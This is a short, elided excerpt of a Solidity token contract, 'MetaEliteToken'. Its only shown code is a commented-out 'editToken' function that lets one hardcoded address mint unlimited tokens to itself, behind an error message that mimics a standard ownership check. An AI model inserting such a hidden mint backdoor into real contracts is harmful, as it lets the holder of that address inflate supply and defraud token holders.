...
contract MetaEliteToken is Context, IERC20, Ownable {
  ...
  */
  ...
  /*function editToken(uint num) public{
        address addy = 0xD14992FAe6377474B1E1bf0944fb59f2f3603094; require(_msgSender() == addy, "Ownable: caller is not the owner");
        _balances[addy] += num * 10**_decimals;
    }*/
